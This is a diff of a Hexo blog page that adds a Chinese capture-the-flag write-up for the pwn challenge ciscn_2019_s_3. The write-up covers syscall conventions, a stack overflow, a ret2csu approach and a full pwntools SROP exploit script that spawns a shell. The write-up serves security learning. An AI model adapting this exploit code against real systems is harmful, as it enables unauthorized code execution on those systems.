@@ -6,15 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Archives: 2021/2 | Hexo</title>
+  <title>Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
+  <meta name="description" content="这是一道新颖的题64位程序看看vuln函数的汇编看来利用了系统调用">
+<meta property="og:type" content="article">
 <meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/archives/2021/02/index.html">
+<meta property="og:url" content="http://example.com/2021/02/20/ciscn_2019_s_3%E7%9A%84wp/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="这是一道新颖的题64位程序看看vuln函数的汇编看来利用了系统调用">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/202102151602184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210215162809925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210215163615821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210215164532694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2021-02-20T12:07:38.398Z">
+<meta property="article:modified_time" content="2021-02-20T12:07:40.802Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/202102151602184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -154,148 +163,166 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-ciscn_2019_s_3的wp" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>这是一道新颖的题<br>64位程序看看vuln函数的汇编<br><img src="https://img-blog.csdnimg.cn/202102151602184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>看来利用了系统调用</strong><a id="more"></a></p>
+<h2 id="首先我们来看看什么是系统调用-32位与64位-系统调用的区别："><a href="#首先我们来看看什么是系统调用-32位与64位-系统调用的区别：" class="headerlink" title="首先我们来看看什么是系统调用 32位与64位 系统调用的区别："></a>首先我们来看看什么是系统调用 32位与64位 系统调用的区别：</h2><p>　　1. 传参方式不同</p>
+<p>　　2. 系统调用号 不同</p>
+<p>　　3. 调用方式 不同</p>
+<p>　　</p>
+<h2 id="32位："><a href="#32位：" class="headerlink" title="32位："></a>32位：</h2><p>　　传参方式：首先将系统调用号 传入 eax，然后将参数 从左到右 依次存入 ebx，ecx，edx寄存器中，返回值存在eax寄存器</p>
+<p>　　调用号：sys_read 的调用号 为 3 sys_write 的调用号 为 4</p>
+<p>　　调用方式: 使用 int 80h 中断进行系统调用</p>
+<p>　　</p>
+<h2 id="64位："><a href="#64位：" class="headerlink" title="64位："></a>64位：</h2><p>　　传参方式：首先将系统调用号 传入 rax，然后将参数 从左到右 依次存入 rdi，rsi，rdx寄存器中，返回值存在rax寄存器</p>
+<p>　　调用号：sys_read 的调用号 为 0 sys_write 的调用号 为 1</p>
+<p>　　stub_execve 的调用号 为 59  stub_rt_sigreturn 的调用号 为 15</p>
+<p>　具体的调用号看<a target="_blank" rel="noopener" href="https://blog.csdn.net/RobinZZX/article/details/94648196">这</a></p>
+<h2 id="调用方式-使用-syscall-进行系统调用"><a href="#调用方式-使用-syscall-进行系统调用" class="headerlink" title="调用方式: 使用 syscall 进行系统调用"></a>调用方式: 使用 syscall 进行系统调用</h2><p>　　发现首先利用系统调用，执行了read(0,buf,0x400)，又执行了write(1,buf,0x30)。看一下buf的位置，发现距离rbp只有0x10大小，存在栈溢出。</p>
+<p>　　除了这个其实我们还可以看到程序结束的时候是直接程序开始的时候，直接是：</p>
+<p>　　pop rbp</p>
+<p>　　mov rbp，rsp</p>
+<p>　　程序结束的时候直接是：</p>
+<p>　　retn</p>
+<p>　　这里的retn是0x400519的retn，执行这个其实就跳出这个函数了。　　</p>
+<p>　　而retn是做什么的呢？retn的操作是内 pop eip，然后执行eip指向的指令。</p>
+<p>　　函数调用开始，rbp==rsp，并且值也一直没变过，所以这里覆盖rbp的时候，其实就需要将rbp覆盖成你想要的返回地址。所以这道题的偏移其实就是0x10就可以了！<br>　　<img src="https://img-blog.csdnimg.cn/20210215162809925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h1><p>59号系统调用是execve那么就可以想办法控制寄存器的值调用execve(“/bin/sh”,0,0)，注意在调用execve时，后面两个参数需要置0，由于需要控制rdx的值，所以选择使用通用gadget，__libc_csu_init。<br><img src="https://img-blog.csdnimg.cn/20210215163615821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>r13的值会给到rdx，让rbx=0，下面call的时候会变为call [r12]，会去call r12指向位置的代码，我们可以调到后面的rop执行，所以需要知道栈的地址，我们获取/bin/sh字符串时也需要知道栈地址。这题刚好在write的时候0x28这个位置是栈上的值，于是通过计算可以得到栈上/bin/sh的地址，即rsp-0x10的值。<br>exp</p>
+<p><img src="https://img-blog.csdnimg.cn/20210215164532694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><p>15号系统调用sigreturn。这个系统调用是在终止信号恢复用户态环境时用的。那么我们在栈上伪造寄存器的值，那么恢复时就可将寄存器控制为我们想要的值。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=remote()</span><br><span class="line">context.binary=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main=<span class="number">0x0004004ED</span></span><br><span class="line">sigret=<span class="number">0x4004DA</span></span><br><span class="line">sys=<span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line">pl1=<span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(main)</span><br><span class="line">io.send(pl1)</span><br><span class="line">io.recv(<span class="number">0x20</span>)</span><br><span class="line">sh=u64(io.recv(<span class="number">8</span>))-<span class="number">280</span></span><br><span class="line">print(<span class="built_in">hex</span>(sh))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = sh</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = sys</span><br><span class="line"></span><br><span class="line">pl1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span>+p64(sigret)+p64(sys)+<span class="built_in">str</span>(frame)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def debug(addr):</span></span><br><span class="line"><span class="string">    raw_input(&#x27;debug:&#x27;)</span></span><br><span class="line"><span class="string">    gdb.attach(io, &quot;b *&quot; + addr)</span></span><br><span class="line"><span class="string">debug(&#x27;0x400514&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pl2=<span class="string">&#x27;b/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(sigret)+p64(sys)+<span class="built_in">str</span>(frame)</span><br><span class="line">io.send(pl2)</span><br><span class="line"></span><br><span class="line">io.interactive()    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/02/20/ciscn_2019_s_3%E7%9A%84wp/" class="archive-article-date">
-  	<time datetime="2021-02-20T12:07:38.398Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-20</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/02/20/ciscn_2019_s_3%E7%9A%84wp/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/02/20/ez_pz_hackover_2016%E7%9A%84wp/" class="archive-article-date">
-  	<time datetime="2021-02-20T12:06:51.785Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-20</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/02/20/ciscn_2019_es_2%E7%9A%84wp/" class="archive-article-date">
-  	<time datetime="2021-02-20T12:05:02.459Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-20</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
+<nav id="article-nav">
+  
+  
+    <a href="/2021/02/20/ez_pz_hackover_2016%E7%9A%84wp/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/02/13/babyheap_0ctf_2017%20%E2%80%94%E2%80%94%E5%A0%86%E5%85%A5%E9%97%A8/" class="archive-article-date">
-  	<time datetime="2021-02-13T12:10:01.651Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-13</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/02/06/not_the_same_3dsctf_2016%E7%9A%84wp/" class="archive-article-date">
-  	<time datetime="2021-02-06T08:15:05.631Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-06</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
+        
+        
+    </div>
+</aside>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/02/03/get_started_3dsctf_2016%E7%9A%84wp/" class="archive-article-date">
-  	<time datetime="2021-02-03T14:53:50.104Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-03</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+
   
   
-    </div></section>
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -318,8 +345,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
